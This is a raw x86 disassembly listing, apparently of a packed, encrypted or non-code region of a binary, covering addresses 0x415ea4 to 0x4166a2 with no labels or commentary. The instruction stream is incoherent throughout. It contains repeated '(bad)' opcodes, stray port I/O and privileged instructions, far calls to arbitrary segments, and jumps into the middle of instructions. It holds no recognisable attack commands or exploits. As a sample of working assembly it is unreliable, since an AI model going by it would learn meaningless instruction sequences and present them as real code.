  415ea4:	loop   0x415e5e
  415ea6:	std    
  415ea7:	out    dx,al
  415ea8:	or     al,BYTE PTR [edx]
  415eaa:	stc    
  415eab:	repnz lahf 
  415ead:	and    ebx,DWORD PTR [ebx-0x405eadc6]
  415eb3:	es add eax,0x26d2dd08
  415eb9:	adc    BYTE PTR [ecx-0x30e83ff2],bl
  415ebf:	cmp    al,0xf4
  415ec1:	push   edx
  415ec2:	sahf   
  415ec3:	ret    0x8af5
  415ec6:	xchg   DWORD PTR [eax],eax
  415ec8:	adc    DWORD PTR [edi],ecx
  415eca:	retf   
  415ecb:	out    0x8f,al
  415ecd:	inc    esp
  415ece:	test   eax,0x292793b4
  415ed3:	xchg   edx,eax
  415ed4:	add    ax,0x522a
  415ed8:	push   esi
  415ed9:	ss inc edi
  415edb:	mov    edi,0xea112e5b
  415ee0:	leave  
  415ee1:	mov    BYTE PTR [edx+0x975287],0x6
  415ee8:	les    esp,FWORD PTR [ebx-0x6816f5a]
  415eee:	xchg   ebp,eax
  415eef:	cs cmp al,0x55
  415ef2:	push   esi
  415ef4:	gs sub eax,0xc6e8f54f
  415efa:	mov    ds,WORD PTR [esi-0x7a1fe7cc]
  415f00:	xchg   edi,eax
  415f01:	rol    BYTE PTR [edx],cl
  415f03:	mov    esi,0x19f00c5d
  415f08:	add    al,0x43
  415f0a:	(bad)  [edi-0x2]
  415f0d:	or     eax,0xe1853877
  415f12:	inc    edi
  415f13:	pop    ebp
  415f14:	cmp    al,0xe3
  415f16:	jb     0x415f1a
  415f18:	sub    ebp,DWORD PTR ss:[ebx+0x814ada2]
  415f1f:	scas   eax,DWORD PTR es:[edi]
  415f20:	xchg   edi,eax
  415f21:	inc    ecx
  415f22:	bswap  esp
  415f24:	gs mov dh,0x39
  415f27:	idiv   DWORD PTR [ecx]
  415f29:	pop    ebp
  415f2a:	pop    eax
  415f2b:	fs adc al,0x5b
  415f2e:	je     0x415f24
  415f30:	inc    esp
  415f31:	cwde   
  415f32:	leave  
  415f33:	sbb    eax,0xa6b14871
  415f38:	cli    
  415f39:	mov    dl,0xdc
  415f3b:	scas   eax,DWORD PTR es:[edi]
  415f3c:	inc    eax
  415f3d:	popa   
  415f3e:	and    BYTE PTR [edx],0xfe
  415f41:	leave  
  415f42:	mov    ebx,esp
  415f44:	into   
  415f45:	(bad)  
  415f46:	gs mov ebx,0xfa9ef56b
  415f4c:	int    0xb0
  415f4e:	pop    ss
  415f4f:	je     0x415f66
  415f51:	xchg   ebp,eax
  415f52:	shl    DWORD PTR [edx-0x14de0ba5],0x35
  415f59:	xlat   BYTE PTR ds:[ebx]
  415f5a:	xchg   edi,eax
  415f5b:	icebp  
  415f5c:	rol    DWORD PTR [eax-0x724ed15b],1
  415f62:	xchg   ecx,eax
  415f63:	je     0x415f6a
  415f65:	mov    ebp,0x40dc826b
  415f6a:	jae    0x415f66
  415f6c:	pop    es
  415f6d:	pop    ecx
  415f6e:	aaa    
  415f6f:	stc    
  415f70:	mov    ebx,0x53027ac5
  415f75:	aad    0x58
  415f77:	sub    BYTE PTR [edi],dh
  415f79:	in     al,0x5d
  415f7b:	jg     0x415f68
  415f7d:	adc    bh,dl
  415f7f:	call   0x85fa:0x2e1ae2ab
  415f86:	sbb    BYTE PTR [ecx+0x470d912b],ah
  415f8c:	mov    esp,DWORD PTR [ebx-0x57a3308f]
  415f92:	ret    
  415f93:	lods   eax,DWORD PTR ds:[esi]
  415f94:	sahf   
  415f95:	dec    edi
  415f96:	out    dx,al
  415f97:	add    al,0x5f
  415f99:	(bad)  
  415f9a:	repz xchg ebx,eax
  415f9c:	add    eax,0x61503241
  415fa1:	into   
  415fa2:	sahf   
  415fa3:	push   esi
  415fa4:	jmp    0x415f9c
  415fa6:	jae    0x415f5f
  415fa8:	inc    eax
  415fa9:	xchg   edi,eax
  415faa:	or     al,BYTE PTR [ecx+0x36]
  415fad:	ret    
  415fae:	scas   eax,DWORD PTR es:[edi]
  415faf:	bound  eax,QWORD PTR [ecx+0x2ce4a0c0]
  415fb5:	ret    
  415fb6:	ror    DWORD PTR [edi+0x32],1
  415fb9:	inc    edi
  415fba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fbb:	dec    ebp
  415fbc:	(bad)  
  415fbd:	adc    ebp,ebp
  415fbf:	inc    edi
  415fc0:	mov    WORD PTR [ebx],si
  415fc3:	mov    WORD PTR [edi-0x326cf89],?
  415fc9:	pushf  
  415fca:	jecxz  0x415fed
  415fcc:	dec    esi
  415fcd:	int3   
  415fce:	dec    edx
  415fcf:	or     eax,esp
  415fd1:	das    
  415fd2:	adc    eax,0x5fcaf38d
  415fd7:	sub    BYTE PTR [eax],bh
  415fd9:	and    eax,0xf37c8fa3
  415fde:	test   cl,0x9a
  415fe1:	sub    DWORD PTR [ecx],eax
  415fe3:	push   DWORD PTR [edx+0x7d]
  415fe6:	test   BYTE PTR [esi],ah
  415fe8:	xor    ebp,DWORD PTR [ecx-0x57]
  415feb:	dec    ebp
  415fec:	arpl   WORD PTR [edx],bp
  415fee:	dec    ecx
  415fef:	push   esi
  415ff0:	aas    
  415ff1:	mov    eax,0x80a2a7ec
  415ff6:	inc    esi
  415ff7:	and    bl,dl
  415ff9:	std    
  415ffa:	and    eax,0xf71c72d2
  415fff:	fs sub dh,bh
  416002:	cwde   
  416003:	clc    
  416004:	sti    
  416005:	dec    ebp
  416006:	mov    fs,WORD PTR [ebp+0x507d1cca]
  41600c:	jns    0x415fea
  41600e:	sub    eax,0x656cd037
  416013:	inc    edx
  416014:	xchg   edi,eax
  416015:	out    dx,eax
  416016:	retf   
  416017:	or     eax,0x268470b6
  41601c:	lds    esi,FWORD PTR [esi+esi*8-0x585ac7de]
  416023:	push   ds
  416024:	test   BYTE PTR [edi-0x6e2c543e],0x18
  41602b:	cmp    BYTE PTR [ebx+0x3085476c],0x74
  416032:	sti    
  416033:	pop    edx
  416034:	or     ah,BYTE PTR [ecx]
  416036:	loopne 0x41607f
  416038:	jle    0x415ff9
  41603a:	out    dx,al
  41603b:	mov    ecx,DWORD PTR [ecx+0x601f9937]
  416041:	aad    0xf
  416043:	fst    DWORD PTR [ebp-0xd944a91]
  416049:	cs in  al,dx
  41604b:	into   
  41604c:	ins    DWORD PTR es:[edi],dx
  41604d:	loopne 0x41604d
  41604f:	outs   dx,DWORD PTR ds:[esi]
  416050:	adc    DWORD PTR cs:[eax-0x5805c24e],ecx
  416057:	mov    al,0xf1
  416059:	push   eax
  41605a:	jg     0x4160bd
  41605c:	mov    BYTE PTR ss:[ebx-0x67],ah
  416060:	das    
  416061:	(bad)  
  416063:	xor    DWORD PTR [ecx-0x16c58c4],edx
  416069:	scas   eax,DWORD PTR es:[edi]
  41606a:	and    al,0x2b
  41606c:	or     eax,0xa45cdd20
  416071:	(bad)  
  416072:	adc    BYTE PTR ds:0x18be8fac,bl
  416078:	dec    eax
  416079:	cdq    
  41607a:	mov    ds:0x2a2ddcb,al
  41607f:	out    dx,al
  416080:	adc    BYTE PTR [ebx+ecx*4+0x7d],cl
  416084:	sbb    eax,0xddad3e44
  416089:	add    al,0x4c
  41608b:	pusha  
  41608c:	xor    BYTE PTR [esi+0x72],bh
  41608f:	jnp    0x4160c6
  416091:	(bad)  
  416092:	in     eax,dx
  416093:	hlt    
  416094:	(bad)  
  416095:	jb     0x416064
  416097:	xor    eax,0x3bff02c3
  41609c:	push   edx
  41609d:	inc    esp
  41609e:	sub    BYTE PTR [edi],bl
  4160a0:	fdivr  DWORD PTR [edx-0x7b03a8cc]
  4160a6:	inc    edi
  4160a7:	push   eax
  4160a8:	adc    edi,ecx
  4160aa:	jnp    0x4160e4
  4160ac:	add    eax,0xffffffad
  4160af:	imul   eax,DWORD PTR [edi+0x4d],0x26
  4160b3:	push   ebp
  4160b4:	mov    WORD PTR [eax+eiz*1+0x1a4e58b7],es
  4160bb:	aaa    
  4160bc:	addr16 push eax
  4160be:	idiv   BYTE PTR [esi+0x79569cb2]
  4160c4:	mov    DWORD PTR [ebx],ebp
  4160c6:	loop   0x4160dc
  4160c8:	xchg   esi,eax
  4160c9:	and    DWORD PTR [esi],esp
  4160cb:	into   
  4160cc:	les    ebp,FWORD PTR [ebx+0x31141558]
  4160d2:	ins    BYTE PTR es:[edi],dx
  4160d3:	mov    bh,0x67
  4160d5:	add    DWORD PTR [ebx-0x30],edx
  4160d8:	mov    edx,0xba5c4907
  4160dd:	mov    esp,0xb0d9f62a
  4160e2:	mov    ?,esp
  4160e4:	lods   eax,DWORD PTR ds:[esi]
  4160e5:	pop    edi
  4160e6:	loope  0x41609a
  4160e8:	out    dx,al
  4160e9:	fsubr  DWORD PTR [ebx-0x46a1d4c7]
  4160ef:	into   
  4160f0:	lock cmp esi,DWORD PTR [esi+0x48739c4f]
  4160f7:	adc    eax,0x963b5d4d
  4160fc:	mov    eax,ds:0x4f8d40e7
  416101:	imul   esi,DWORD PTR [ecx],0x44
  416104:	leave  
  416105:	pop    ds
  416106:	xor    DWORD PTR [ebx-0x5b],esp
  416109:	jnp    0x4160f5
  41610b:	and    BYTE PTR [eax-0x3e],0xf6
  41610f:	add    esp,DWORD PTR [ebx]
  416111:	lods   eax,DWORD PTR ds:[esi]
  416112:	xor    BYTE PTR ds:0x7757fa6f,ch
  416118:	sahf   
  416119:	mov    bl,0xaf
  41611b:	outs   dx,DWORD PTR ds:[esi]
  41611c:	jns    0x416111
  41611e:	(bad)  
  41611f:	and    ebx,ebx
  416121:	rcl    ch,cl
  416123:	cmp    eax,0x4639f3de
  416128:	inc    eax
  416129:	hlt    
  41612a:	lock push ds
  41612c:	adc    al,bl
  41612e:	adc    eax,0xdc596349
  416133:	int3   
  416134:	xor    ebp,DWORD PTR [ecx]
  416136:	in     al,0x97
  416138:	push   0x6efd3e
  41613d:	cmp    DWORD PTR [ebx-0x9ea8af],ecx
  416143:	(bad)  
  416144:	out    0xb8,al
  416146:	mov    ah,0x4c
  416148:	popf   
  416149:	je     0x416107
  41614b:	adc    DWORD PTR [ebx],ecx
  41614d:	js     0x41612e
  41614f:	xchg   BYTE PTR ds:0xc1febe93,al
  416155:	xchg   ebx,eax
  416156:	add    eax,0xa904a294
  41615b:	mov    ecx,DWORD PTR [ecx+0x36ab8b2]
  416161:	sub    bh,BYTE PTR [ecx+0x633b083c]
  416167:	fistp  DWORD PTR [edx-0x7c874a45]
  41616d:	or     cl,al
  41616f:	xchg   ebp,eax
  416170:	adc    esp,eax
  416172:	mov    DWORD PTR [edx-0x6fc516aa],edi
  416178:	aaa    
  416179:	aad    0xf6
  41617b:	loopne 0x416196
  41617d:	mov    WORD PTR cs:0xe4d6831a,?
  416184:	push   es
  416185:	dec    ebx
  416186:	xor    al,0x3c
  416188:	cli    
  416189:	cmp    ah,BYTE PTR [esi+0x2c4c619f]
  41618f:	out    0x15,al
  416191:	pop    ebp
  416192:	clc    
  416193:	xor    DWORD PTR ds:0xee473387,esp
  416199:	push   ss
  41619a:	mov    ds:0x8c6e95e,eax
  41619f:	sbb    BYTE PTR [edx-0x5d026f5f],bh
  4161a5:	jnp    0x416189
  4161a7:	(bad)  
  4161a8:	lahf   
  4161a9:	mov    ah,0xd8
  4161ab:	les    edi,FWORD PTR [esi-0x5e]
  4161ae:	mov    al,ds:0xda1a2bff
  4161b3:	sahf   
  4161b4:	dec    esi
  4161b5:	mov    BYTE PTR [esi+eiz*8],ch
  4161b8:	lods   al,BYTE PTR ds:[esi]
  4161b9:	loopne 0x41618a
  4161bb:	cmp    BYTE PTR [eax],0x13
  4161be:	push   ss
  4161bf:	test   eax,0x8ddfe818
  4161c4:	pop    edx
  4161c5:	call   0x9c1e:0x940f11f6
  4161cc:	in     al,dx
  4161cd:	pop    esi
  4161ce:	(bad)  
  4161cf:	(bad)  
  4161d0:	sub    cl,bh
  4161d2:	loopne 0x416203
  4161d4:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4161d6:	inc    esi
  4161d7:	or     eax,0x523024cd
  4161dc:	or     DWORD PTR [ebx-0x53],ebx
  4161df:	adc    edi,DWORD PTR [eax+0x11]
  4161e2:	cld    
  4161e3:	adc    al,0x20
  4161e5:	stos   DWORD PTR es:[edi],eax
  4161e6:	mov    edx,0x3ef20604
  4161eb:	ret    0xce89
  4161ee:	cli    
  4161ef:	ficom  WORD PTR [ebx-0x50]
  4161f2:	icebp  
  4161f3:	lds    ebx,FWORD PTR [eax+0x7f]
  4161f6:	sar    DWORD PTR [eax],0x95
  4161f9:	scas   al,BYTE PTR es:[edi]
  4161fa:	int    0xd5
  4161fc:	mov    ah,0xa9
  4161fe:	add    edx,DWORD PTR [ecx+0x7a]
  416201:	mov    esp,0x9cfd044a
  416206:	scas   al,BYTE PTR es:[edi]
  416207:	cmp    eax,0x70509c1
  41620c:	sbb    al,0xde
  41620e:	clc    
  41620f:	stos   DWORD PTR es:[edi],eax
  416210:	cmp    edi,DWORD PTR ds:0x6edc08b
  416216:	xchg   dx,ax
  416218:	inc    edx
  416219:	add    eax,0x2ee6a9ec
  41621e:	mov    esp,0xf4f50731
  416223:	ds ja  0x4161c0
  416226:	adc    dl,BYTE PTR [ebx]
  416228:	mov    bh,dh
  41622a:	fidiv  WORD PTR [edi+0x63372615]
  416230:	cmp    al,BYTE PTR [edi+0x2d698a6d]
  416236:	sbb    eax,0x848e4081
  41623b:	popf   
  41623c:	and    al,ah
  41623e:	push   0x8f47cc79
  416243:	inc    edi
  416244:	std    
  416245:	das    
  416246:	repz mov edi,0x5c18c17c
  41624c:	pop    edx
  41624d:	push   edx
  41624e:	ss pop ss
  416250:	mov    ebp,0x719f822b
  416255:	mov    esp,DWORD PTR [edi+0x72]
  416258:	pop    ss
  416259:	or     ebp,ebx
  41625b:	xchg   ecx,eax
  41625c:	xchg   edi,eax
  41625d:	test   DWORD PTR [ebx],esp
  41625f:	test   DWORD PTR [ecx-0xdf52715],ebx
  416265:	inc    eax
  416266:	xchg   ecx,eax
  416267:	xor    al,BYTE PTR [edi+0x42200a00]
  41626d:	rcl    dh,cl
  41626f:	or     DWORD PTR [ebx],edx
  416271:	push   eax
  416272:	out    dx,al
  416273:	or     ebx,ebp
  416275:	xchg   ebp,eax
  416276:	push   cs
  416277:	loopne 0x416223
  416279:	test   BYTE PTR [ebx-0x346cdfd6],dh
  41627f:	icebp  
  416280:	(bad)  
  416281:	mov    eax,edx
  416283:	inc    ecx
  416284:	add    ebx,DWORD PTR [ecx]
  416286:	aam    0xcc
  416288:	mov    al,ds:0xdb97660f
  41628d:	cmp    esi,edx
  41628f:	inc    esi
  416290:	js     0x4162ca
  416292:	(bad)  
  416293:	loopne 0x416265
  416295:	dec    BYTE PTR [eax+ebx*8+0xdb0eb28]
  41629c:	push   ebp
  41629d:	inc    esi
  41629e:	out    0xc7,eax
  4162a0:	and    eax,0x7d1a9712
  4162a5:	(bad)  
  4162a6:	jne    0x4162dc
  4162a8:	mov    bl,0xa0
  4162aa:	mov    ebx,0x646c34aa
  4162af:	popa   
  4162b0:	adc    ch,BYTE PTR [ebp-0x7d59ad42]
  4162b6:	loopne 0x416306
  4162b8:	imul   ecx,ebp,0x16
  4162bb:	pop    ds
  4162bc:	aas    
  4162bd:	jp     0x4162ed
  4162bf:	or     ebp,DWORD PTR [eax]
  4162c1:	ja     0x4162da
  4162c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162c4:	dec    esp
  4162c5:	aad    0x5d
  4162c7:	scas   eax,DWORD PTR es:[edi]
  4162c8:	mov    edi,0xae19623d
  4162cd:	std    
  4162ce:	lds    edi,FWORD PTR [edi]
  4162d0:	inc    ecx
  4162d1:	dec    ebp
  4162d2:	fmul   DWORD PTR [esi+0x17c4a91a]
  4162d8:	dec    ecx
  4162d9:	rcl    BYTE PTR [ebp+0x23],cl
  4162dc:	cmp    ebp,ebp
  4162de:	shl    DWORD PTR [ebx-0x465d1a44],cl
  4162e4:	push   edi
  4162e5:	test   al,0x32
  4162e7:	mov    esp,0xc19d40b6
  4162ec:	xor    ebx,DWORD PTR [ecx]
  4162ee:	push   ecx
  4162ef:	rol    DWORD PTR [ebx-0x4e],0x49
  4162f3:	xor    al,0x11
  4162f5:	inc    ecx
  4162f6:	xor    eax,0xd7bd98f5
  4162fb:	int    0x26
  4162fd:	lock dec edi
  4162ff:	outs   dx,DWORD PTR ds:[esi]
  416300:	push   edx
  416301:	xor    al,BYTE PTR [eax+esi*1+0x4f]
  416305:	xchg   esi,eax
  416306:	ja     0x41636d
  416308:	and    ebp,DWORD PTR [edi+0x4e]
  41630b:	icebp  
  41630c:	and    BYTE PTR cs:[ecx+0x87effb4],cl
  416313:	add    esp,ebx
  416315:	das    
  416316:	pop    ebx
  416317:	cmp    BYTE PTR [ebp+0x46],bh
  41631a:	mov    esp,0x62b67f63
  41631f:	fdiv   QWORD PTR [ecx+esi*8]
  416322:	adc    esp,ebx
  416324:	lea    edx,[ebx]
  416326:	mov    esp,0x8e5b5985
  41632b:	cmp    DWORD PTR [ebx+eax*8+0x50],esi
  41632f:	add    esp,DWORD PTR [edx+0x369da4bb]
  416335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416336:	shr    DWORD PTR [edi],1
  416338:	inc    edi
  416339:	dec    esp
  41633a:	mov    eax,0xcc54178
  41633f:	mov    al,ds:0x2797547e
  416344:	mov    WORD PTR [ecx],?
  416346:	inc    ebp
  416347:	in     al,dx
  416348:	xor    DWORD PTR [ecx+ecx*2+0xca901ba],esp
  41634f:	imul   eax,esi,0xffffffa5
  416352:	shl    ah,1
  416354:	ja     0x41632a
  416356:	jbe    0x416374
  416358:	sbb    eax,0xb78b7a69
  41635d:	js     0x416314
  41635f:	pop    edx
  416360:	xor    al,0x40
  416362:	pusha  
  416363:	pop    ss
  416364:	push   ebx
  416365:	and    DWORD PTR [edi-0x75],edi
  416368:	xchg   ebp,eax
  416369:	sub    ecx,edx
  41636b:	imul   esi,DWORD PTR [edi+ecx*1-0x1d],0x3a
  416370:	mov    ds:0x2eb5c78b,eax
  416375:	push   edx
  416376:	mov    eax,es
  416378:	outs   dx,BYTE PTR ds:[esi]
  416379:	repz jbe 0x416346
  41637c:	xor    eax,0xa52e55fc
  416381:	mov    bh,0xe9
  416383:	outs   dx,DWORD PTR ds:[esi]
  416384:	fnsave ss:[edx]
  416387:	mov    bh,0x3d
  416389:	push   ss
  41638a:	sbb    eax,0xf9d7da3a
  41638f:	push   es
  416390:	popf   
  416391:	out    0x9c,al
  416393:	std    
  416394:	jo     0x416349
  416396:	call   0x5960:0x36718364
  41639d:	inc    esp
  41639e:	mov    ch,0x2d
  4163a0:	jl     0x41636a
  4163a2:	xlat   BYTE PTR ds:[ebx]
  4163a3:	sahf   
  4163a4:	inc    eax
  4163a5:	shr    esp,cl
  4163a7:	jbe    0x416344
  4163a9:	xor    DWORD PTR [eax+0x77],0x9830a4e3
  4163b0:	jns    0x416401
  4163b2:	and    al,0x2f
  4163b4:	icebp  
  4163b5:	or     DWORD PTR [edx+esi*8-0x22],esp
  4163b9:	sbb    edi,DWORD PTR [edx-0xe]
  4163bc:	data16 sbb cl,cl
  4163bf:	or     dh,BYTE PTR [edx+0x773ef9cf]
  4163c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163c6:	mov    dh,0x15
  4163c8:	out    dx,al
  4163c9:	add    BYTE PTR [esi-0x72],ah
  4163cc:	sub    dh,BYTE PTR [edx]
  4163ce:	or     DWORD PTR [eax+0x2ae7df75],eax
  4163d4:	sbb    eax,0xd8886a38
  4163d9:	test   eax,0xe48d837a
  4163de:	retf   0x47ba
  4163e1:	mov    eax,0x8200cb1c
  4163e6:	call   0x69547d46
  4163eb:	pop    esi
  4163ec:	ds stc 
  4163ee:	inc    esi
  4163ef:	sub    eax,0x36366dc4
  4163f4:	cmp    eax,0x4e73f15d
  4163f9:	test   eax,0x8709406c
  4163fe:	and    DWORD PTR [ecx+0x539d0222],edx
  416404:	cmp    al,0xbd
  416406:	loopne 0x416399
  416408:	stos   BYTE PTR es:[edi],al
  416409:	mov    cl,0xb6
  41640b:	adc    esp,DWORD PTR [esi-0x65]
  41640e:	out    dx,al
  41640f:	inc    ebx
  416410:	loopne 0x4163a2
  416412:	and    DWORD PTR [ebx-0x65],ebp
  416415:	adc    bl,dl
  416417:	lods   al,BYTE PTR ds:[esi]
  416418:	xor    al,0xd5
  41641a:	test   BYTE PTR [ebp+0xbbd109c],dl
  416420:	jne    0x416466
  416422:	sub    BYTE PTR [edi-0x70],al
  416425:	adc    BYTE PTR [edi-0x75],dh
  416428:	and    BYTE PTR [ebp+0x65a2cbf3],bl
  41642e:	clc    
  41642f:	add    dl,BYTE PTR [esi]
  416431:	jns    0x4163c0
  416433:	imul   ecx,esi,0x89dce337
  416439:	dec    esp
  41643a:	mov    bl,0x62
  41643c:	sbb    bl,al
  41643e:	cli    
  41643f:	sbb    al,0x1a
  416441:	mov    ebx,0x7692e55e
  416446:	rol    dh,0x6e
  416449:	jbe    0x416499
  41644b:	lods   al,BYTE PTR ds:[esi]
  41644c:	enter  0x8a1c,0x89
  416450:	dec    ebp
  416451:	in     al,dx
  416452:	rcr    BYTE PTR [edi-0x3212586c],cl
  416458:	pop    ebp
  416459:	mov    ebp,0x8197dfaa
  41645e:	mov    ebp,edx
  416460:	mov    edx,0x9c68fd46
  416465:	stos   BYTE PTR es:[edi],al
  416466:	fucomip st,st(1)
  416468:	(bad)  
  416469:	repz call FWORD PTR [edi]
  41646c:	bound  ebx,QWORD PTR ds:0x78973e21
  416472:	xor    eax,0x97d63255
  416477:	js     0x416471
  416479:	mov    eax,ds:0xf674b999
  41647e:	jmp    FWORD PTR [ebp-0x76]
  416481:	stos   BYTE PTR es:[edi],al
  416482:	push   eax
  416483:	pop    edx
  416484:	popf   
  416485:	mov    eax,ds:0x42dd20d7
  41648a:	call   0xa728:0x967190a5
  416491:	scas   al,BYTE PTR es:[edi]
  416492:	addr16 aam 0xb6
  416495:	loop   0x41650d
  416497:	adc    eax,0x84f9a788
  41649c:	lock push es
  41649e:	xchg   esi,eax
  41649f:	push   ds
  4164a0:	cmp    al,0x6c
  4164a2:	fnstenv [edx-0x716356cc]
  4164a8:	push   esi
  4164a9:	adc    BYTE PTR [ecx],0x79
  4164ac:	xchg   esi,eax
  4164ad:	add    eax,0x3f2f21d4
  4164b2:	call   0xb123208a
  4164b7:	out    0x1b,al
  4164b9:	xor    al,BYTE PTR [ebx]
  4164bb:	loop   0x4164c8
  4164bd:	sub    BYTE PTR [ebx],bl
  4164bf:	scas   eax,DWORD PTR es:[edi]
  4164c0:	mov    ch,0x4e
  4164c2:	outs   dx,BYTE PTR ds:[esi]
  4164c3:	nop
  4164c4:	xor    DWORD PTR [eax-0x2bdeb7ad],esp
  4164ca:	outs   dx,BYTE PTR ds:[esi]
  4164cb:	outs   dx,BYTE PTR ds:[esi]
  4164cd:	iret   
  4164ce:	jge    0x4164d3
  4164d0:	ja     0x4164c7
  4164d2:	inc    ebx
  4164d3:	sbb    al,0x5e
  4164d5:	dec    ecx
  4164d6:	mov    esi,DWORD PTR [esi+edx*2+0x167560dc]
  4164dd:	mov    ss,WORD PTR [edi+0x5a7901eb]
  4164e3:	mov    dh,0x7e
  4164e5:	push   edi
  4164e6:	test   DWORD PTR [ebx-0x7894d1fe],ecx
  4164ec:	bound  esi,QWORD PTR [edi]
  4164ee:	addr16 dec edi
  4164f0:	ds jo  0x416528
  4164f3:	dec    edi
  4164f4:	pop    es
  4164f5:	xchg   esi,eax
  4164f6:	addr16 call 0xb57b:0xa7e7532c
  4164fe:	(bad)  
  416500:	inc    ebp
  416501:	sbb    al,0x65
  416503:	inc    edi
  416504:	mov    bl,0x4a
  416506:	or     ebx,ecx
  416508:	jge    0x4164d3
  41650a:	outs   dx,DWORD PTR ds:[esi]
  41650b:	adc    eax,0x1f7a1788
  416510:	pop    es
  416511:	dec    edi
  416512:	nop
  416513:	push   edx
  416514:	js     0x416574
  416516:	adc    DWORD PTR [edi-0x4fab4003],edx
  41651c:	ja     0x416505
  41651e:	dec    eax
  41651f:	mov    eax,ds:0x264a2d41
  416524:	stc    
  416525:	add    cl,al
  416527:	popf   
  416528:	imul   esp,DWORD PTR [ebx-0x57],0x15b191dc
  41652f:	push   ecx
  416530:	dec    edx
  416531:	add    dh,al
  416533:	xor    bl,0x24
  416536:	cmp    eax,0x74a67e27
  41653b:	and    esi,ebp
  41653d:	icebp  
  41653e:	lods   al,BYTE PTR ds:[esi]
  41653f:	fistp  WORD PTR [esi-0x4a]
  416542:	cmp    bh,dl
  416544:	mov    ebx,esi
  416546:	dec    esp
  416547:	and    eax,0x3011cfb7
  41654c:	call   FWORD PTR [edi-0x37]
  41654f:	ret    
  416550:	jmp    0x33a4661d
  416555:	and    al,0x46
  416557:	push   edi
  416558:	daa    
  416559:	int    0x24
  41655b:	jae    0x4164f0
  41655d:	add    al,0x5
  41655f:	adc    eax,0xcbafb539
  416565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416566:	mov    eax,0xb86ae4a3
  41656b:	imul   DWORD PTR [ecx]
  41656d:	inc    esi
  41656e:	pop    ss
  41656f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416570:	test   BYTE PTR [esi],ch
  416572:	fisubr WORD PTR [edi]
  416574:	and    DWORD PTR [edi+0x22],esi
  416577:	adc    ecx,ebp
  416579:	imul   eax,DWORD PTR ds:0xd7e6263e,0x43486772
  416583:	jmp    0x416535
  416585:	shufps xmm0,xmm5,0x78
  416589:	lahf   
  41658a:	push   cs
  41658b:	das    
  41658c:	push   ebp
  41658d:	jle    0x416523
  41658f:	test   al,0x19
  416591:	push   esp
  416592:	leave  
  416593:	pop    es
  416594:	mov    DWORD PTR [esi+ecx*1-0x57],edi
  416598:	ins    DWORD PTR es:[edi],dx
  416599:	inc    ebx
  41659a:	jae    0x416602
  41659c:	inc    esi
  41659d:	aad    0xdd
  41659f:	add    edi,edi
  4165a1:	mov    ebx,0xc559a69f
  4165a6:	rcr    BYTE PTR [edx+edi*4-0x664f1039],0xa9
  4165ae:	pop    es
  4165af:	and    al,0x14
  4165b1:	sbb    dl,BYTE PTR [edi+0x57055457]
  4165b7:	add    dh,0x74
  4165ba:	add    al,0xf1
  4165bc:	cdq    
  4165bd:	mov    bl,0xfd
  4165bf:	lods   al,BYTE PTR cs:[esi]
  4165c1:	ins    DWORD PTR es:[edi],dx
  4165c2:	push   eax
  4165c3:	push   ss
  4165c4:	cld    
  4165c5:	in     eax,dx
  4165c6:	pop    esi
  4165c7:	call   0x13a:0x4c60835e
  4165ce:	or     ebx,DWORD PTR [ecx+eiz*4-0x9]
  4165d2:	icebp  
  4165d3:	popa   
  4165d4:	scas   eax,DWORD PTR es:[edi]
  4165d5:	sub    DWORD PTR [ecx],esp
  4165d7:	sub    BYTE PTR [eiz*1+0x6c8a5ce2],dl
  4165de:	and    esi,DWORD PTR [esi+0x4e]
  4165e1:	and    bl,BYTE PTR [edx]
  4165e3:	inc    ebx
  4165e4:	push   0xffffffe0
  4165e6:	add    eax,ecx
  4165e8:	inc    esi
  4165e9:	xor    eax,esi
  4165eb:	sub    dl,BYTE PTR [ebx-0x23]
  4165ee:	and    al,0xa
  4165f0:	scas   al,BYTE PTR es:[edi]
  4165f1:	add    BYTE PTR [ebp-0x31],0xda
  4165f5:	pop    edx
  4165f6:	or     al,bl
  4165f8:	imul   esi,edx,0x29
  4165fb:	pop    ds
  4165fc:	inc    edi
  4165fd:	dec    esp
  4165fe:	sub    DWORD PTR [ecx-0x1a],0x374c46ed
  416605:	aaa    
  416606:	dec    ebp
  416607:	js     0x416643
  416609:	mov    ah,0x50
  41660b:	rcl    DWORD PTR [edi+0x7f1dc1c5],cl
  416611:	(bad)  
  416612:	adc    al,0x57
  416614:	leave  
  416615:	jecxz  0x416604
  416617:	(bad)  
  416618:	pop    eax
  416619:	pop    edx
  41661a:	push   0xa62916c1
  41661f:	das    
  416620:	sahf   
  416621:	sub    DWORD PTR [eax],ebp
  416623:	(bad)  
  416624:	(bad)  
  416626:	jnp    0x41669e
  416628:	jo     0x4166a7
  41662a:	adc    cl,dl
  41662c:	shr    BYTE PTR ds:0xd4d6ad0c,cl
  416632:	fisttp WORD PTR [ebx]
  416634:	leave  
  416635:	mov    DWORD PTR [edi],0x650516
  41663b:	repnz xor ebx,DWORD PTR [ebx]
  41663e:	push   esp
  41663f:	aad    0xa
  416641:	(bad)  
  416642:	adc    ebx,ecx
  416644:	cmp    edx,DWORD PTR [eax+0x34]
  416647:	pop    edx
  416648:	paddsb mm4,mm2
  41664b:	lahf   
  41664c:	stc    
  41664d:	xor    DWORD PTR [edx+0x3816ff7],edx
  416653:	or     eax,0xc0558522
  416658:	in     al,0x75
  41665a:	pop    es
  41665b:	xor    eax,0x9cd3e4b7
  416660:	nop
  416661:	(bad)  
  416663:	test   eax,0x80cda9d5
  416668:	fcom   st(5)
  41666a:	sbb    dh,BYTE PTR [edx+0x2354d4d]
  416670:	(bad)
  416674:	test   al,0xde
  416676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416677:	in     al,0xb0
  416679:	sbb    edx,DWORD PTR ds:0x4181fb81
  41667f:	inc    esp
  416680:	fmulp  st(3),st
  416682:	mov    bh,BYTE PTR [eax+edi*8-0x48fba770]
  416689:	sti    
  41668a:	adc    bl,ah
  41668c:	ret    0x62bc
  41668f:	and    al,0xe
  416691:	sbb    al,0x88
  416693:	add    al,0x23
  416695:	jecxz  0x416691
  416697:	jmp    0x322b:0xbf6e7c56
  41669e:	outs   dx,DWORD PTR ds:[esi]
  41669f:	pop    eax
  4166a0:	jle    0x416658
  4166a2:	push   ss
